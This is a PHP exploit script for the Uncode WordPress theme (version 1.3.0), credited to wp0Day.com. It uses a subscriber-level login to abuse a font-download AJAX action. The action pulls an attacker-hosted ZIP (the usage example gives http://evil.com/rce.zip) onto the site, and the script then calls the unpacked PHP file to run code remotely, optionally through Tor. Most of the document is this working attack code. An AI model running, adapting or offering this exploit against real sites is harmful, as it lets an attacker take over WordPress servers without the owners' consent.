/**
 * Exploit Title: Uncode WP Theme RCE Expoit
 * Google Dork:
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Vendor Homepage:
 * Version: 1.3.0 possible 1.3.1
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: RCE, Arbirary file UPLOAD, (Low Authenticated )
 * Time line: Found [24-APR-2016], Vendor notified [24-APR-2016], Vendor fixed: [27-APR-2016], [RD:1464134400]
 */
 
 
require_once(&#039;curl.php&#039;);
//OR
//include(&#039;https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php&#039;);
$curl = new CurlWrapper();
 
 
$options = getopt("t:u:p:f:",array(&#039;tor:&#039;));
print_r($options);
$options = validateInput($options);
 
if (!$options){
    showHelp();
}
 
if ($options[&#039;tor&#039;] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get(&#039;https://dynamicdns.park-your-domain.com/getip&#039;);
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType &#039;wololo&#039; to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != &#039;wololo&#039;){
        die("Aborting!\n");
    }
    echo "OK...\n";
}
 
 
function logIn(){
    global $curl, $options;
    file_put_contents(&#039;cookies.txt&#039;,"\n");
    $curl->setCookieFile(&#039;cookies.txt&#039;);
    $curl->get($options[&#039;t&#039;]);
    $data = array(&#039;log&#039;=>$options[&#039;u&#039;], &#039;pwd&#039;=>$options[&#039;p&#039;], &#039;redirect_to&#039;=>$options[&#039;t&#039;], &#039;wp-submit&#039;=>&#039;Log In&#039;);
    $curl->post($options[&#039;t&#039;].&#039;/wp-login.php&#039;, $data);
    $status =  $curl->getTransferInfo(&#039;http_code&#039;);
    if ($status !== 302){
        echo "Login probably failed, aborting...\n";
        echo "Login response saved to login.html.\n";
        die();
    }
    file_put_contents(&#039;login.html&#039;,$curl->getResponse());
 
 
}
 
function exploit(){
    global $curl, $options;
    echo "Generateing payload.\n";
    $data = array(&#039;action&#039;=>&#039;uncodefont_download_font&#039;, &#039;font_url&#039;=>$options[&#039;f&#039;]);
    echo "Sending payload\n";
    $curl->post($options[&#039;t&#039;].&#039;/wp-admin/admin-ajax.php&#039;, $data);
    $resp = $curl->getResponse();
    echo "Eco response: ".$resp."\n";
    $resp = json_decode($resp,true);
    if ($resp[&#039;success&#039;] === &#039;Font downloaded and extracted successfully.&#039;){
        echo "Response ok, calling RCE\n";
        $file_path = parse_url($options[&#039;f&#039;]);
        $remote_file_info = pathinfo($file_path[&#039;path&#039;]);
        $zip_file_name = $remote_file_info[&#039;basename&#039;];
        $zip_file_name_php  = str_replace(&#039;.zip&#039;, &#039;.php&#039;, $zip_file_name);
        $url = $options[&#039;t&#039;].&#039;wp-content/uploads/uncode-fonts/&#039;.$zip_file_name.&#039;/&#039;.$zip_file_name_php;
        echo &#039;Url: &#039;. $url."\n";
        //POC Test mode
        if ($file_path[&#039;host&#039;] == &#039;wp0day.com&#039;){
            echo "Exploit test mode on\n";
            $rnd = rand();
            echo "Rand $rnd, MD5: ".md5($rnd)."\n";
            $url = $url . &#039;?poc=&#039;.$rnd;
        }
        $curl->get($url);
        echo "RCE Response:";
        echo $curl->getResponse()."\n\n";
    }
}
 
 
logIn();
exploit();
 
 
 
function validateInput($options){
 
    if ( !isset($options[&#039;t&#039;]) || !filter_var($options[&#039;t&#039;], FILTER_VALIDATE_URL) ){
        return false;
    }
    if ( !isset($options[&#039;u&#039;]) ){
        return false;
    }
    if ( !isset($options[&#039;p&#039;]) ){
        return false;
    }
    if ( !isset($options[&#039;f&#039;]) ){
        return false;
    }
        $options[&#039;t&#039;] = $options[&#039;t&#039;].&#039;/&#039;;
    }
 
    $options[&#039;tor&#039;] = isset($options[&#039;tor&#039;]);
 
    return $options;
}
 
 
function showHelp(){
    global $argv;
    $help = <<<EOD
 
    Uncode WP Theme RCE Expoit
 
Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USERNAME] -p [PASSWORD] -f [URL]
 
       *** You need to have a valid login (customer or subscriber will do) in order to use this "exploit" **
 
       [URL] It must be ZIP file. It gets unzipped into /wp-content/uploads/uncode-fonts/[some.zip]/files folder
       Example: rce.php -> zip -> rce.zip -> http://evil.com/rce.zip -> /wp-content/uploads/uncode-fonts/rce.zip/rce.php
 
 
 
Examples:
 
    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License
 
EOD;
    echo $help."\n\n";
    die();
}

